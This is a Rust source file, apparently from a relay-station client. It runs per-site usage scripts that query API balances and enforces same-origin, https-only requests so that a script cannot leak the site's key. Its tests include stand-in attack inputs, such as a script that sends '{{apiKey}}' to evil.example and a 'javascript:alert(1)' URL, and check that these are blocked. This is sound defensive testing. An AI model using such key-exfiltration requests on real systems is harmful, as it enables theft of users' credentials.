// Portions derived from cc-switch v4.0.14 (https://github.com/farion1231/cc-switch, commit 5de6feb4e5adda61f4ad824ce0df2c449245f447), Copyright (c) 2025 Jason Young, MIT License — see ATTRIBUTION.md.
//! 站点的用量脚本（中转站重构阶段 6 · U4，cc-switch 的 `usage_script.rs` 外面那一层）。沙箱在 `qb-script`（只算，不联网、不碰文件）。
//!
//! # 怎么用
//!
//! 每个站点可以存一段脚本（库里的 `site-usage-script:<站点 id>`）。开着的话，中转站页站点卡表头那一格就用它问余额
//! （[`super::site_quota_ops`] 先看有没有开着的脚本，再看内置认得的那几家）；节奏跟 U3 一样：打开页面问一次
//! （同一把 Key、同一段脚本 5 分钟内复用）、点刷新再问。没有定时器。
//!
//! 脚本里能用的变量：`{{apiKey}}`（这条线路的 Key）、`{{baseUrl}}`（站点地址，去掉结尾的 `/`）、`{{origin}}`（协议 + 主机 + 端口）。
//!
//! # ⛔ 守住的
//!
//! - **请求地址必须跟站点地址同源**（协议 + 主机 + 端口），**而且是 https**，没有例外（本机回环地址的站点允许 http）。
//!   cc-switch 的「自定义模板」会跳过同源检查 —— 那样一段脚本就能把这个站点的 Key 发到任何地方，这里不照做。
//! - 不跟随跳转（`station_billing::http_client`），回复最多 1 MiB，回复内容不原样进报错。
//! - Key 只在跑的那一刻换进 `{{apiKey}}`；存下来的脚本里没有 Key（界面提醒别把 Key 直接写进脚本）。
//! - 结果**只显示**：调度、排序一概不读它。
//! - 导入链接里的用量脚本照旧不导入（阶段 5 的决定：链接带来的代码不在面板里跑）。

use super::station_billing;
use crate::error::{GateError, Result};
use crate::repository::Repository;
use qb_station::station::site_quota::{SiteBalance, SiteQuota, SiteQuotaKind};
use serde::{Deserialize, Serialize};
use serde_json::Value;
use ts_rs::TS;

/// 回复最多读多少。
const REPLY_MAX: usize = 1 << 20;

/// 一个站点存的用量脚本。
#[derive(Debug, Clone, Default, PartialEq, Serialize, Deserialize, TS)]
#[ts(export)]
pub struct UsageScript {
    pub enabled: bool,
    pub code: String,
    /// 最后存的时刻（RFC3339）。
    pub updated_at: Option<String>,
}

fn meta_key(station_id: &str) -> String {
    format!("site-usage-script:{station_id}")
}

pub fn get(db: &Repository, station_id: &str) -> Result<UsageScript> {
    Ok(db
        .meta(&meta_key(station_id))?
        .map(|raw| serde_json::from_str(&raw))
        .transpose()?
        .unwrap_or_default())
}

pub fn save(db: &Repository, station_id: &str, enabled: bool, code: &str) -> Result<UsageScript> {
    if code.len() > qb_script::SCRIPT_MAX {
        return Err(GateError::Other("脚本太长了（最多 64 KiB）".into()));
    }
    if enabled && code.trim().is_empty() {
        return Err(GateError::Other("脚本是空的，不能开".into()));
    }
    let s = UsageScript {
        enabled,
        code: code.to_string(),
        updated_at: Some(chrono::Utc::now().to_rfc3339()),
    };
    db.set_meta(&meta_key(station_id), &serde_json::to_string(&s)?)?;
    Ok(s)
}

/// 开着的那一段脚本（没有、关着就是 `None`）。
pub(crate) fn enabled(db: &Repository, station_id: &str) -> Result<Option<String>> {
    let s = get(db, station_id)?;
    Ok((s.enabled && !s.code.trim().is_empty()).then_some(s.code))
}

/// 站点地址的「源」：协议 + 主机 + 端口（默认端口补齐）。
fn origin(url: &reqwest::Url) -> Option<(String, String, u16)> {
    Some((
        url.scheme().to_string(),
        url.host_str()?.to_ascii_lowercase(),
        url.port_or_known_default()?,
    ))
}

fn loopback(host: &str) -> bool {
    matches!(host, "localhost" | "127.0.0.1" | "[::1]" | "::1")
}

/// 脚本要发的地址能不能发：同源、https（回环地址允许 http）、不带用户名密码。
pub fn check_url(request: &str, site: &str) -> std::result::Result<reqwest::Url, String> {
    let site_url = reqwest::Url::parse(site).map_err(|_| format!("站点地址认不出来：{site}"))?;
    let url = reqwest::Url::parse(request).map_err(|_| {
        "脚本给的请求地址不是一个完整的网址（要带 https://，可以用 {{origin}}）".to_string()
    })?;
    if !url.username().is_empty() || url.password().is_some() {
        return Err("请求地址里不许带用户名密码".into());
    }
    let (scheme, host, port) = origin(&url).ok_or("请求地址没有主机名")?;
    let site_origin = origin(&site_url).ok_or("站点地址没有主机名")?;
    if (scheme.clone(), host.clone(), port) != site_origin {
        return Err(format!(
            "请求地址必须跟站点同源（{}://{}:{}），脚本给的是 {scheme}://{host}:{port} —— Key 不发给别的地方",
            site_origin.0, site_origin.1, site_origin.2
        ));
    }
    if scheme != "https" && !(scheme == "http" && loopback(&host)) {
        return Err("请求地址必须是 https（只有本机回环地址的站点允许 http）".into());
    }
    Ok(url)
}

/// 脚本里那几个变量的值。
fn vars(base_url: &str, key: &str) -> std::result::Result<Vec<(&'static str, String)>, String> {
    let site =
        reqwest::Url::parse(base_url).map_err(|_| format!("站点地址认不出来：{base_url}"))?;
    let host = site.host_str().ok_or("站点地址没有主机名")?;
    let origin = match site.port() {
        Some(p) => format!("{}://{host}:{p}", site.scheme()),
        None => format!("{}://{host}", site.scheme()),
    };
    Ok(vec![
        ("apiKey", key.to_string()),
        ("baseUrl", base_url.trim_end_matches('/').to_string()),
        ("origin", origin),
    ])
}

/// extractor 的结果 → 站点卡表头那一格。
fn to_quota(v: &Value) -> std::result::Result<SiteQuota, String> {
    let items: Vec<&Value> = match v {
        Value::Array(a) => a.iter().collect(),
        other => vec![other],
    };
    let num = |x: &Value, k: &str| x.get(k).and_then(Value::as_f64).filter(|n| n.is_finite());
    let text = |x: &Value, k: &str| x.get(k).and_then(Value::as_str).map(str::to_string);
    let balances: Vec<SiteBalance> = items
        .iter()
        .filter_map(|x| {
            Some(SiteBalance {
                remaining: num(x, "remaining")?,
                total: num(x, "total"),
                used: num(x, "used"),
                unit: text(x, "unit").unwrap_or_default(),
            })
        })
        .collect();
    if balances.is_empty() {
        return Err("脚本的结果里没有 remaining（剩多少）".into());
    }
    let warning = items
        .iter()
        .find(|x| x.get("isValid").and_then(Value::as_bool) == Some(false))
        .map(|x| text(x, "invalidMessage").unwrap_or_else(|| "脚本说这把 Key 现在不可用".into()));
    Ok(SiteQuota {
        provider: "用量脚本".into(),
        kind: SiteQuotaKind::Balance,
        balances,
        windows: Vec::new(),
        plan: items.iter().find_map(|x| text(x, "planName")),
        warning,
        fetched_at: chrono::Utc::now().to_rfc3339(),
        route_id: String::new(),
    })
}

async fn blocking<T: Send + 'static>(
    job: impl FnOnce() -> std::result::Result<T, String> + Send + 'static,
) -> Result<T> {
    tokio::task::spawn_blocking(job)
        .await
        .map_err(|e| GateError::Other(format!("脚本的任务异常结束：{e}")))?
        .map_err(GateError::Other)
}

/// 跑一遍：求出请求 → 核对地址 → 发 → extractor。`base_url` / `key` 是这条线路的站点地址和 Key。
pub async fn run(code: &str, base_url: &str, key: &str) -> Result<SiteQuota> {
    let vars = vars(base_url, key).map_err(GateError::Other)?;
    let filled = qb_script::fill(
        code,
        &vars
            .iter()
            .map(|(k, v)| (*k, v.as_str()))
            .collect::<Vec<_>>(),
    );
    let script = filled.clone();
    let request = blocking(move || qb_script::request_of(&script)).await?;
    let url = check_url(&request.url, base_url).map_err(GateError::Other)?;
    let method: reqwest::Method = request
        .method
        .to_ascii_uppercase()
        .parse()
        .map_err(|_| GateError::Other(format!("不认识的请求方法：{}", request.method)))?;
    let mut builder = station_billing::http_client()?.request(method, url);
    for (k, v) in &request.headers {
        builder = builder.header(k.as_str(), v.as_str());
    }
    if let Some(body) = request.body {
        builder = builder.body(body);
    }
    let response = builder.send().await.map_err(|e| {
        GateError::Other(if e.is_timeout() {
            "用量脚本的请求超时了".into()
        } else {
            "用量脚本的请求连不上站点".into()
        })
    })?;
    let status = response.status().as_u16();
    if status == 401 || status == 403 {
        return Err(GateError::Other(format!(
            "站点拒绝了这把 Key（HTTP {status}）—— 看看脚本里的地址和请求头对不对"
        )));
    }
    if !(200..300).contains(&status) {
        return Err(GateError::Other(station_billing::http_problem(
            status,
            false,
            "用量脚本的请求",
        )));
    }
    let bytes = response
        .bytes()
        .await
        .map_err(|_| GateError::Other("用量脚本的回复没读完".into()))?;
    if bytes.len() > REPLY_MAX {
        return Err(GateError::Other(
            "用量脚本的回复太大了（超过 1 MiB）".into(),
        ));
    }
    let body = String::from_utf8_lossy(&bytes).to_string();
    let result = blocking(move || qb_script::extract(&filled, &body)).await?;
    to_quota(&result).map_err(GateError::Other)
}

/// 用这条线路的 Key 把（还没存的）脚本跑一遍：地址核对跟正式跑一样，不进缓存。
pub async fn test(route_id: &str, code: &str) -> Result<SiteQuota> {
    let (base_url, key) = {
        let db = Repository::open()?;
        let routes: Vec<qb_station::station::route::Route> =
            db.list("station_routes").unwrap_or_default();
        let route = routes
            .into_iter()
            .find(|r| r.id == route_id)
            .ok_or_else(|| GateError::Other("找不到这条线路".into()))?;
        let source = super::station_ops::source(&db, &route)?;
        (source.base_url, source.key)
    };
    let mut q = run(code, &base_url, &key).await?;
    q.route_id = route_id.to_string();
    Ok(q)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_request_must_stay_on_the_site_and_use_https() {
        let site = "https://relay.example/v1";
        assert!(check_url("https://relay.example/api/usage", site).is_ok());
        assert!(
            check_url("https://RELAY.example:443/x", site).is_ok(),
            "默认端口算同源"
        );
        for bad in [
            "https://evil.example/collect?k=1",
            "https://relay.example.evil.example/x",
            "https://relay.example:8443/x",
            "http://relay.example/x",
            "https://user:pw@relay.example/x",
            "/relative",
            "javascript:alert(1)",
        ] {
            assert!(check_url(bad, site).is_err(), "{bad}");
        }
        // 本机回环地址的站点允许 http（本机自己起的服务）。
        assert!(check_url("http://127.0.0.1:3000/api", "http://127.0.0.1:3000").is_ok());
        assert!(check_url("http://127.0.0.1:3001/api", "http://127.0.0.1:3000").is_err());
    }

    #[test]
    fn variables_give_the_key_the_trimmed_address_and_the_origin() {
        let v = vars("https://relay.example:8443/v1/", "sk-1").unwrap();
        assert_eq!(v[0], ("apiKey", "sk-1".into()));
        assert_eq!(v[1], ("baseUrl", "https://relay.example:8443/v1".into()));
        assert_eq!(v[2], ("origin", "https://relay.example:8443".into()));
    }

    #[test]
    fn the_result_needs_a_remaining_and_keeps_what_the_script_said() {
        let q = to_quota(&serde_json::json!([
            {"planName": "月卡", "remaining": 3.5, "total": 10, "used": 6.5, "unit": "USD"},
            {"isValid": false, "invalidMessage": "Key 被停用"}
        ]))
        .unwrap();
        assert_eq!(q.balances.len(), 1);
        assert_eq!(q.balances[0].total, Some(10.0));
        assert_eq!(q.plan.as_deref(), Some("月卡"));
        assert_eq!(q.warning.as_deref(), Some("Key 被停用"));
        assert!(to_quota(&serde_json::json!({"planName": "x"})).is_err());
    }

    #[tokio::test]
    async fn a_script_that_points_elsewhere_never_sends_the_key() {
        let code = r#"({ request: { url: "https://evil.example/?k={{apiKey}}" }, extractor: function (r) { return r; } })"#;
        let err = run(code, "https://relay.example/v1", "sk-secret")
            .await
            .unwrap_err()
            .to_string();
        assert!(err.contains("同源"), "{err}");
        assert!(!err.contains("sk-secret"), "报错里不带 Key");
    }

    #[test]
    fn saving_checks_the_script_and_round_trips() {
        let root = std::env::temp_dir().join(format!(
            "qb-usage-script-{}-{}",
            std::process::id(),
            crate::config_io::id()
        ));
        let db = Repository::open_in(&root).unwrap();
        assert_eq!(get(&db, "s1").unwrap(), UsageScript::default());
        assert!(save(&db, "s1", true, "  ").is_err(), "空脚本不能开");
        let saved = save(&db, "s1", true, "({})").unwrap();
        assert_eq!(get(&db, "s1").unwrap(), saved);
        assert_eq!(enabled(&db, "s1").unwrap().as_deref(), Some("({})"));
        save(&db, "s1", false, "({})").unwrap();
        assert_eq!(enabled(&db, "s1").unwrap(), None);
        drop(db);
        std::fs::remove_dir_all(root).unwrap();
    }
}
